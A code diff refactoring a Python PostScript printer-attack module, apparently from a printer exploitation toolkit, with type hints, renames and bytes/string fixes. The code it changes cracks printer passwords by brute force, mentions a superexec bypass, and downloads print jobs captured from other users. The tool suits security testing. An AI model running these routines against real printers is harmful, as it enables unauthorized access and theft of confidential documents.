@@ -401,10 +401,12 @@ class postscript(printer):
     if not arg:
       print("No password given, cracking.") # 140k tries/sec on lj4250!
       output().chitchat("If this ain't successful, try 'unlock bypass'")
-      arg = self.timeoutcmd(b'/min 0 def /max ' + str(max).encode() + b' def\n'
+      a = self.timeoutcmd(b'/min 0 def /max ' + str(max).encode() + b' def\n'
               b'statusdict begin {min 1 max\n'
               b'  {dup checkpassword {== flush stop}{pop} ifelse} for\n'
               b'} stopped pop', self.timeout * 100)
+      if a:
+        arg = a.decode()
     # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # superexec can be used to reset PostScript passwords on most devices
     elif arg == 'bypass':
@@ -670,36 +672,36 @@ class postscript(printer):
         b'  (' + c.DELIMITER + b'\\n) print\n'
         b'} forall clear} if')
       # grep for metadata in captured jobs
-      jobs = []
+      listed_jobs: List[Tuple] = []
       for val in [_f for _f in bytes_recv.split(c.DELIMITER) if _f]:
         date = conv().timediff(item(re.findall(b'Date: (.*)', val)))
         size = conv().filesize(item(re.findall(b'Size: (.*)', val)))
         user = item(re.findall(b'For: (.*)', val))
         name = item(re.findall(b'Title: (.*)', val))
         soft = item(re.findall(b'Creator: (.*)', val))
-        jobs.append((date, size, user, name, soft))
+        listed_jobs.append((date, size, user, name, soft))
       # output metadata for captured jobs
-      if jobs:
+      if listed_jobs:
         output().joblist(('date', 'size', 'user', 'jobname', 'creator'))
         output().hline(79)
-        for job in jobs: output().joblist(job)
+        for listed_job in listed_jobs: output().joblist(listed_job)
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # save captured print jobs
     elif arg.startswith('fetch'):
-      jobs = self.cmd(b'userdict /capturedict known {capturedict {exch ==} forall} if').splitlines()
-      if not jobs: output().raw("No jobs captured")
+      fetched_jobs: List[bytes] = self.cmd(b'userdict /capturedict known {capturedict {exch ==} forall} if').splitlines()
+      if not fetched_jobs: output().raw("No jobs captured")
       else:
-        for job in jobs:
+        for fetched_job in fetched_jobs:
           # is basename sufficient to sanatize file names? we'll see…
-          target, job = self.basename(self.target), self.basename(job)
-          root = os.path.join('capture', target)
-          lpath = os.path.join(root, job + '.ps')
+          target, fetched_job_base = self.basename(self.target), self.basename(fetched_job)
+          root = os.path.join(b'capture', target)
+          lpath = os.path.join(root, fetched_job_base + b'.ps')
           self.makedirs(root)
           # download captured job
-          output().raw("Receiving " + lpath)
+          output().raw("Receiving " + lpath.decode())
           data = b'%!\n'
           data += self.cmd(b'/byte (0) def\n'
-            b'capturedict ' + job + b' get dup resetfile\n'
+            b'capturedict ' + fetched_job_base + b' get dup resetfile\n'
             b'{dup read {byte exch 0 exch put\n'
             b'(%stdout) (w) file byte writestring}\n'
             b'{exit} ifelse} loop')
@@ -839,15 +841,15 @@ class postscript(printer):
     "Return a list of dictionaries and their permissions."
     output().info("acl   len   max   dictionary")
     output().info("────────────────────────────")
-    for dict in self.options_dump:
-      bytes_recv = self.cmd(b'1183615869 ' + dict + b'\n'
+    for d in self.options_dump:
+      bytes_recv = self.cmd(b'1183615869 ' + d + b'\n'
                             b'dup rcheck {(r) print}{(-) print} ifelse\n'
                             b'dup wcheck {(w) print}{(-) print} ifelse\n'
                             b'dup xcheck {(x) print}{(-) print} ifelse\n'
                             b'( ) print dup length 128 string cvs print\n'
                             b'( ) print maxlength  128 string cvs print')
       if len(bytes_recv.split()) == 3:
-        output().info("%-5s %-5s %-5s %s" % tuple(bytes_recv.split() + [dict]))
+        output().info("%-5s %-5s %-5s %s" % tuple(x.decode() for x in bytes_recv.split() + [d]))
 
   # ------------------------[ dump <dict> ]-----------------------------
   def do_dump(self, arg: str, resource=False):
@@ -972,16 +974,16 @@ class postscript(printer):
   # ------------------------[ resource <category> [dump] ]--------------
   def do_resource(self, arg: str):
     args = re.split(r"\s+", arg, 1)
-    cat, dump = args[0].encode(), len(args) > 1
+    cat, dump = args[0], len(args) > 1
     self.populate_resource()
-    if cat in self.options_resource:
-      cat: bytes
+    c = cat.encode()
+    if c in self.options_resource:
       bytes_send = b'(*) {128 string cvs print (\\n) print}'\
-                   b' 128 string /' + cat + b' resourceforall'
+                   b' 128 string /' + c + b' resourceforall'
       items = self.cmd(bytes_send).splitlines()
       for item in sorted(items):
         output().info(item)
-        if dump: self.do_dump((b'/' + item + b' /' + cat + b' findresource').decode(), True)
+        if dump: self.do_dump((b'/' + item + b' /' + c + b' findresource').decode(), True)
     else:
       self.onecmd("help resource")
 
@@ -993,7 +995,7 @@ class postscript(printer):
     if len(self.options_resource) > 0: last = sorted(self.options_resource)[-1]
     for res in sorted(self.options_resource): print((('└─ ' if res == last else '├─ ') + res.decode()))
 
-  options_resource = []
+  options_resource: List[bytes] = []
   def complete_resource(self, text, line, begidx, endidx):
     return [cat for cat in self.options_resource if cat.startswith(text)]
 
